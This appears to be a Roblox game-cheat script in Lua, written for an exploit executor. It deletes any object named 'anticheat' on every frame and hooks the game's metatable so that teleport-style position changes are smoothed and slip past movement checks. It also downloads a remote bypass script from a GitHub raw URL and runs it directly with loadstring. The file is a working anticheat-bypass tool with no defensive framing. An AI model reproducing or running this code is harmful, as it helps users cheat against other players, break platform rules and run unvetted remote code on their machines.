local lplr = game:GetService("Players").LocalPlayer
local request = request or http_request or http and http.request or syn and syn.request
local metatable = (getrawmetatable or get_raw_metatable or getraw_metatable or debug and debug.getmetatable)(game)
local tween = game:GetService("TweenService")
local backup;
local speed = 0.2
function check(v)
    for a, b in next, v:GetChildren() do
        if b.Name:lower() == "anticheat" then
            b:Destroy()
        end
    end
end
function c2()
    if lplr and lplr:FindFirstChild("PlayerScripts") then
        check(lplr.PlayerScripts)
    end
    if lplr and lplr:FindFirstChild("PlayerGui") then
        check(lplr.PlayerGui)
    end
end
game:GetService("RunService").Stepped:Connect(c2)
game:GetService("RunService").Heartbeat:Connect(c2)
game:GetService("RunService").RenderStepped:Connect(c2)
loadstring((request({Url = "https://raw.githubusercontent.com/zesty-codes/AnticheatBypasserLua/main/ScriptContextBypasser.lua", Method = "GET"})["Body"]))()
backup = hookfunction(metatable.__newindex, newcclosure(function(self, property, value)
    if property == "CFrame" and (self:IsA("Part") or self:IsA("BasePart") or self:IsA("MeshPart")) and checkcaller() then
        return tween:Create(self, TweenInfo.new(speed, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {CFrame = value}):Play()
    end
    return backup(self, property, value)
end))
